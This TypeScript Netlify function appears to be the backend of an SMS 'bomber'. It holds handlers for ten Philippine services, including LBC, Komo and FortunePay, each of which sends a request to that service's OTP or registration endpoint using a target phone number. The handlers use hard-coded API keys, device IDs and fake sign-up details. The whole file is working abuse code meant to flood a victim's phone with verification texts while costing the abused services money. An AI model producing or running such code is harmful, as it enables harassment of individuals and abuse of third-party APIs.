import { Handler } from "@netlify/functions";
import axios from "axios";

const services = [
  {
    name: "S5.com",
    handler: async (num: string) => {
      const formatted = num.startsWith("0") ? "+63" + num.slice(1) : "+63" + num;
      const boundary = "----WebKitFormBoundary" + Math.random().toString(36).slice(2);
      const data = `--${boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n${formatted}\r\n--${boundary}--\r\n`;
      const res = await axios.post("https://api.s5.com/player/api/v1/otp/request", data, {
        headers: {
          "content-type": `multipart/form-data; boundary=${boundary}`,
          "x-public-api-key": "d6a6d988-e73e-4402-8e52-6df554cbfb35",
        },
        timeout: 10000,
      });
      return res.status;
    },
  },
  {
    name: "Xpress PH",
    handler: async (num: string) => {
      const formatted = num.startsWith("0") ? "+63" + num.slice(1) : "+63" + num;
      const res = await axios.post("https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp", {
        FirstName: "Test",
        LastName: "User",
        Email: `test${Date.now()}@gmail.com`,
        Phone: formatted,
        Password: "Password123!",
        ConfirmPassword: "Password123!",
        RoleIds: [4],
        FingerprintVisitorId: "TPt0yCuOFim3N3rzvrL1",
      }, { timeout: 10000 });
      return res.status;
    },
  },
  {
    name: "Abenson",
    handler: async (num: string) => {
      const res = await axios.post("https://api.mobile.abenson.com/api/public/membership/activate_otp", 
        `contact_no=${num}&login_token=undefined`, 
        { headers: { "Content-Type": "application/x-www-form-urlencoded" }, timeout: 10000 }
      );
      return res.status;
    },
  },
  {
    name: "Excellente Lending",
    handler: async (num: string) => {
      const res = await axios.post("https://api.excellenteralending.com/dllin/union/rehabilitation/dock", {
        domain: num,
        cat: "login",
        previous: false,
        financial: "efe35521e51f924efcad5d61d61072a9"
      }, {
        headers: {
          "x-package-name": "com.support.excellenteralending",
          "x-adid": "efe35521e51f924efcad5d61d61072a9"
        },
        timeout: 10000
      });
      return res.status;
    },
  },
  {
    name: "FortunePay",
    handler: async (num: string) => {
      const cleanNum = num.startsWith("0") ? num.slice(1) : num;
      const res = await axios.post("https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register", {
        deviceId: "c31a9bc0-652d-11f0-88cf-9d4076456969",
        deviceType: "GOOGLE_PLAY",
        companyId: "4bf735e97269421a80b82359e7dc2288",
        dialCode: "+63",
        phoneNumber: cleanNum
      }, { timeout: 10000 });
      return res.status;
    },
  },
  {
    name: "WeMove",
    handler: async (num: string) => {
      const cleanNum = num.startsWith("0") ? num.slice(1) : num;
      const res = await axios.post("https://api.wemove.com.ph/auth/users", {
        phone_country: "+63",
        phone_no: cleanNum
      }, { timeout: 10000 });
      return res.status;
    },
  },
  {
    name: "LBC",
    handler: async (num: string) => {
      const cleanNum = num.startsWith("0") ? num.slice(1) : num;
      const res = await axios.post("https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification", 
        `verification_type=mobile&client_contact_code=%2B63&client_contact_no=${cleanNum}&app_platform=Android`,
        { headers: { "Content-Type": "application/x-www-form-urlencoded", "api": "LBC", "token": "CONNECT" }, timeout: 10000 }
      );
      return res.status;
    },
  },
  {
    name: "Pickup Coffee",
    handler: async (num: string) => {
      const formatted = num.startsWith("0") ? "+63" + num.slice(1) : "+63" + num;
      const res = await axios.post("https://production.api.pickup-coffee.net/v2/customers/login", {
        mobile_number: formatted,
        login_method: "mobile_number"
      }, { headers: { "x-env": "Production", "x-app-version": "2.7.0" }, timeout: 10000 });
      return res.status;
    },
  },
  {
    name: "HoneyLoan",
    handler: async (num: string) => {
      const res = await axios.post("https://api.honeyloan.ph/api/client/registration/step-one", {
        phone: num,
        is_rights_block_accepted: 1
      }, { timeout: 10000 });
      return res.status;
    },
  },
  {
    name: "Komo",
    handler: async (num: string) => {
      const res = await axios.post("https://api.komo.ph/api/otp/v5/generate", {
        mobile: num,
        transactionType: 6
      }, { headers: { "Ocp-Apim-Subscription-Key": "cfde6d29634f44d3b81053ffc6298cba" }, timeout: 10000 });
      return res.status;
    },
  }
];

export const handler: Handler = async (event) => {
  if (event.httpMethod === "GET" && event.path.endsWith("/services")) {
    return {
      statusCode: 200,
      body: JSON.stringify(services.map(s => s.name)),
    };
  }

  if (event.httpMethod !== "POST") {
    return { statusCode: 405, body: "Method Not Allowed" };
  }

  try {
    const { number, serviceIndex } = JSON.parse(event.body || "{}");
    const idx = parseInt(serviceIndex);
    const service = services[idx];

    if (!service) {
      return { statusCode: 400, body: JSON.stringify({ error: `Invalid service index: ${serviceIndex}` }) };
    }

    const status = await service.handler(number);
    return {
      statusCode: 200,
      body: JSON.stringify({ name: service.name, status: "SUCCESS", code: status }),
    };
  } catch (error: any) {
    return {
      statusCode: 200, // Return 200 so the frontend can handle the "FAILED" status in the JSON
      body: JSON.stringify({ status: "FAILED", error: error.message }),
    };
  }
};
